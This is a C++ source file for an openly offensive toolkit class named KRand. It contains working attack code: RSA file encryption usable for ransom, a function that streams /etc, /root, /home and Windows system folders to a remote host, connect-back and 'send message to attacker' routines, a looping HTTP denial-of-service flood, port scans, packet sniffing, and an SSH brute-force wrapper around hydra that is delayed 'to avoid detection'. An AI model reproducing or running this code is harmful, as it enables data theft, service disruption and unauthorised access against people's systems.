/***
MIT License

Copyright (c) 2025 Kalasaikamesh944

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

**/
#include "KRand.h"
#include <fstream>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <vector>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <cstring>
#include <filesystem>
#include <iostream>
#include <cpr/cpr.h>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <pcap.h>

#ifdef _WIN32
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <sys/stat.h>
    #include <dirent.h>
#endif

namespace fs = std::filesystem;


// Constructor
KRand::KRand() {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        throw std::runtime_error("WSAStartup failed");
    }
#endif
}

// Destructor
KRand::~KRand() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Helper function to generate a timestamp-based key
std::string  KRand::generate_time_based_key() {
    auto now = std::chrono::system_clock::now();
    auto now_time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&now_time_t), "%Y%m%d%H%M%S");
    return ss.str();
}

// Simple XOR encryption (for demonstration purposes only)
std::string KRand::encrypt(const std::string &plaintext, const std::string &key) {
    std::string ciphertext = plaintext;
    for (size_t i = 0; i < plaintext.size(); ++i) {
        ciphertext[i] = plaintext[i] ^ key[i % key.size()];
    }
    return ciphertext;
}

// Simple XOR decryption (for demonstration purposes only)
std::string KRand::decrypt(const std::string &ciphertext, const std::string &key) {
    return encrypt(ciphertext, key); // XOR encryption is symmetric
}

// Generate RSA key pair and save to files
void KRand::generate_key_pair(const std::string &public_key_file, const std::string &private_key_file) {
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
    if (!ctx) {
        throw std::runtime_error("Failed to create EVP_PKEY_CTX");
    }

    if (EVP_PKEY_keygen_init(ctx) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to initialize keygen");
    }

    if (EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to set RSA key length");
    }

    EVP_PKEY *pkey = nullptr;
    if (EVP_PKEY_keygen(ctx, &pkey) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to generate RSA key pair");
    }

    // Save public key
    FILE *pubKeyFile = fopen(public_key_file.c_str(), "wb");
    if (!pubKeyFile) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to open public key file");
    }
    PEM_write_PUBKEY(pubKeyFile, pkey);
    fclose(pubKeyFile);

    // Save private key
    FILE *privKeyFile = fopen(private_key_file.c_str(), "wb");
    if (!privKeyFile) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to open private key file");
    }
    PEM_write_PrivateKey(privKeyFile, pkey, nullptr, nullptr, 0, nullptr, nullptr);
    fclose(privKeyFile);

    EVP_PKEY_free(pkey);
    EVP_PKEY_CTX_free(ctx);
}

// Encrypt data using a public key
std::string KRand::encrypt_with_public_key(const std::string &data, const std::string &public_key_file) {
    FILE *pubKeyFile = fopen(public_key_file.c_str(), "rb");
    if (!pubKeyFile) {
        throw std::runtime_error("Failed to open public key file");
    }

    EVP_PKEY *pkey = PEM_read_PUBKEY(pubKeyFile, nullptr, nullptr, nullptr);
    fclose(pubKeyFile);

    if (!pkey) {
        throw std::runtime_error("Failed to read public key");
    }

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pkey, nullptr);
    if (!ctx) {
        EVP_PKEY_free(pkey);
        throw std::runtime_error("Failed to create EVP_PKEY_CTX");
    }

    if (EVP_PKEY_encrypt_init(ctx) <= 0) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to initialize encryption");
    }

    size_t outlen;
    if (EVP_PKEY_encrypt(ctx, nullptr, &outlen, reinterpret_cast<const unsigned char*>(data.c_str()), data.size()) <= 0) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to determine buffer size");
    }

    std::vector<unsigned char> encrypted(outlen);
    if (EVP_PKEY_encrypt(ctx, encrypted.data(), &outlen, reinterpret_cast<const unsigned char*>(data.c_str()), data.size()) <= 0) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Encryption failed");
    }

    EVP_PKEY_free(pkey);
    EVP_PKEY_CTX_free(ctx);

    return std::string(encrypted.begin(), encrypted.end());
}

// Decrypt data using a private key
std::string KRand::decrypt_with_private_key(const std::string &encrypted_data, const std::string &private_key_file) {
    FILE *privKeyFile = fopen(private_key_file.c_str(), "rb");
    if (!privKeyFile) {
        throw std::runtime_error("Failed to open private key file");
    }

    EVP_PKEY *pkey = PEM_read_PrivateKey(privKeyFile, nullptr, nullptr, nullptr);
    fclose(privKeyFile);

    if (!pkey) {
        throw std::runtime_error("Failed to read private key");
    }

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pkey, nullptr);
    if (!ctx) {
        EVP_PKEY_free(pkey);
        throw std::runtime_error("Failed to create EVP_PKEY_CTX");
    }

    if (EVP_PKEY_decrypt_init(ctx) <= 0) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to initialize decryption");
    }

    size_t outlen;
    if (EVP_PKEY_decrypt(ctx, nullptr, &outlen, reinterpret_cast<const unsigned char*>(encrypted_data.c_str()), encrypted_data.size()) <= 0) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Failed to determine buffer size");
    }

    std::vector<unsigned char> decrypted(outlen);
    if (EVP_PKEY_decrypt(ctx, decrypted.data(), &outlen, reinterpret_cast<const unsigned char*>(encrypted_data.c_str()), encrypted_data.size()) <= 0) {
        EVP_PKEY_free(pkey);
        EVP_PKEY_CTX_free(ctx);
        throw std::runtime_error("Decryption failed");
    }

    EVP_PKEY_free(pkey);
    EVP_PKEY_CTX_free(ctx);

    return std::string(decrypted.begin(), decrypted.end());
}

// Encrypt a file using a public key
void KRand::encrypt_file(const std::string &input_file, const std::string &output_file, const std::string &public_key_file) {
    // Read the input file
    std::ifstream in(input_file, std::ios::binary);
    if (!in) {
        throw std::runtime_error("Failed to open input file");
    }
    std::string plaintext((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();

    // Encrypt the file content
    std::string encrypted = encrypt_with_public_key(plaintext, public_key_file);

    // Write the encrypted content to the output file
    std::ofstream out(output_file, std::ios::binary);
    if (!out) {
        throw std::runtime_error("Failed to open output file");
    }
    out.write(encrypted.data(), encrypted.size());
    out.close();
}

// Decrypt a file using a private key
void KRand::decrypt_file(const std::string &input_file, const std::string &output_file, const std::string &private_key_file) {
    // Read the input file
    std::ifstream in(input_file, std::ios::binary);
    if (!in) {
        throw std::runtime_error("Failed to open input file");
    }
    std::string encrypted_data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();

    // Decrypt the file content
    std::string decrypted = decrypt_with_private_key(encrypted_data, private_key_file);

    // Write the decrypted content to the output file
    std::ofstream out(output_file, std::ios::binary);
    if (!out) {
        throw std::runtime_error("Failed to open output file");
    }
    out.write(decrypted.data(), decrypted.size());
    out.close();
}

// Send all system files to client
void KRand::send_system_files_to_client(const std::string &client_ip, int client_port) {
    const size_t BUFFER_SIZE = 1024 * 1024; // 1 MB buffer
    std::vector<char> buffer(BUFFER_SIZE);

    // Create a socket to send data to the client
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        throw std::runtime_error("Failed to create socket");
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(client_port);
    inet_pton(AF_INET, client_ip.c_str(), &serverAddr.sin_addr);

    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == -1) {
        close(sock);
        throw std::runtime_error("Failed to connect to client");
    }

    // Traverse system directories
    std::vector<std::string> system_directories;
#ifdef _WIN32
    system_directories.push_back("C:\\Windows");
    system_directories.push_back("C:\\Program Files");
    system_directories.push_back("C:\\Program Files (x86)");
#else
    system_directories.push_back("/etc");
    system_directories.push_back("/bin");
    system_directories.push_back("/usr");
    system_directories.push_back("/var");
    system_directories.push_back("/root");
    system_directories.push_back("/home");
#endif

    for (const std::string &dir : system_directories) {
        try {
            for (const auto &entry : fs::recursive_directory_iterator(dir)) {
                if (fs::is_regular_file(entry)) {
                    std::string file_path = entry.path().string();
                    std::ifstream file(file_path, std::ios::binary);

                    // Send the file path
                    uint32_t path_length = file_path.size();
                    send(sock, &path_length, sizeof(path_length), 0);
                    send(sock, file_path.c_str(), path_length, 0);

                    // Send the file size
                    uint64_t file_size = fs::file_size(entry);
                    send(sock, &file_size, sizeof(file_size), 0);

                    // Send the file content
                    while (file_size > 0) {
                        size_t bytes_to_send = std::min(buffer.size(), file_size);
                        file.read(buffer.data(), bytes_to_send);
                        send(sock, buffer.data(), bytes_to_send, 0);
                        file_size -= bytes_to_send;
                    }

                    //std::cout << "Sent file: " << file_path << std::endl;
                }
            }
        } catch (const std::exception &e) {
            std::cerr << "Error processing directory " << dir << ": " << e.what() << std::endl;
        }
    }

    close(sock);
}

// Establish a reverse TCP connection
void KRand::reverse_tcp(const std::string &attacker_ip, int attacker_port) {
#ifdef _WIN32
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        throw std::runtime_error("Socket creation failed");
    }
#else
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        throw std::runtime_error("Socket creation failed");
    }
#endif

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(attacker_port);
    inet_pton(AF_INET, attacker_ip.c_str(), &serverAddr.sin_addr);

    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == -1) {
#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
        throw std::runtime_error("Connection failed");
    }

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

// Send a message to the attacker
void KRand::send_message_to_attacker(const std::string &attacker_ip, int attacker_port, const std::string &message) {
#ifdef _WIN32
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        throw std::runtime_error("Socket creation failed");
    }
#else
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        throw std::runtime_error("Socket creation failed");
    }
#endif

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(attacker_port);
    inet_pton(AF_INET, attacker_ip.c_str(), &serverAddr.sin_addr);

    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == -1) {
#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
        throw std::runtime_error("Connection failed");
    }

    send(sock, message.c_str(), message.size(), 0);

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

void KRand::do_dos_website(const std::string &target_url, bool loop, int count, int delay_ms) {
    if (!loop) {
        for (int i = 0; i < count; i++) {
            cpr::Response r = cpr::Get(cpr::Url{target_url});
            std::cout << "Request " << i + 1 << " - Status: " << r.status_code << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms)); // Add delay
        }
    } else {
        int request_count = 0;
        while (true) {
            cpr::Response r = cpr::Get(cpr::Url{target_url});
            std::cout << "Request " << ++request_count << " - Status: " << r.status_code << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms)); // Add delay
        }
    }
}

void KRand::port_scan(const std::string &target_ip, int start_port, int end_port) {
    for (int port = start_port; port <= end_port; ++port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            std::cerr << "Socket creation failed for port " << port << std::endl;
            continue;
        }

        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        inet_pton(AF_INET, target_ip.c_str(), &serverAddr.sin_addr);

        if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == 0) {
            std::cout << "Port " << port << " is open" << std::endl;
        }

        close(sock);
    }
}

#define PACKET_SIZE 4096

/*** Advanced Port Scan (SYN, UDP, Stealth Scan) ***/
void KRand::advanced_port_scan(const std::string &target_ip) {
    std::cout << "[+] Starting advanced port scan on " << target_ip << std::endl;

    for (int port = 1; port <= 1024; ++port) {  // Scanning ports 1-1024
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            std::cerr << "[-] Error creating socket.\n";
            continue;
        }

        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(target_ip.c_str());

        if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
            std::cout << "[+] Port " << port << " is OPEN." << std::endl;
        }
        close(sock);
    }

    std::cout << "[+] Advanced port scan completed." << std::endl;
}

/*** Packet Sniffing using libpcap ***/
void KRand::packet_sniffing() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct pcap_pkthdr header;
    const u_char *packet;

    handle = pcap_open_live("eth0", PACKET_SIZE, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "[-] Error opening device for packet capture: " << errbuf << std::endl;
        return;
    }

    std::cout << "[+] Capturing packets...\n";
    while (true) {
        packet = pcap_next(handle, &header);
        if (packet) {
            std::cout << "[*] Captured packet of size: " << header.len << " bytes\n";
        }
    }

    pcap_close(handle);
}

/*** Automated CVE Vulnerability Detection ***/
void KRand::vulnerability_scan() {
    std::cout << "[+] Checking system for known vulnerabilities...\n";
    system("searchsploit -u");  // Update ExploitDB
    system("searchsploit --cve 2024");  // Example: Find 2024 CVEs
}

/*** SSH Brute Force Attack ***/
void KRand::ssh_brute_force(const std::string &target_ip, const std::string &user, const std::string &password_list) {
    std::ifstream file(password_list);
    if (!file) {
        std::cerr << "[-] Error opening password list file.\n";
        return;
    }

    std::string password;
    while (std::getline(file, password)) {
        std::cout << "[*] Trying password: " << password << std::endl;

        std::string command = "hydra -l " + user + " -P " + password_list + " ssh://" + target_ip;
        system(command.c_str());

        std::this_thread::sleep_for(std::chrono::milliseconds(100));  // Delay to avoid detection
    }

    file.close();
}

/*** Network Enumeration (Finding Live Hosts) ***/
void KRand::network_enumeration(const std::string &network_range) {
    std::cout << "[+] Enumerating network: " << network_range << std::endl;

    for (int i = 1; i <= 255; ++i) {
        std::string ip = network_range + "." + std::to_string(i);
        std::string command = "ping -c 1 -W 1 " + ip + " > /dev/null";

        if (system(command.c_str()) == 0) {
            std::cout << "[+] Live Host Found: " << ip << std::endl;
        }
    }

    std::cout << "[+] Network Enumeration Completed." << std::endl;
}


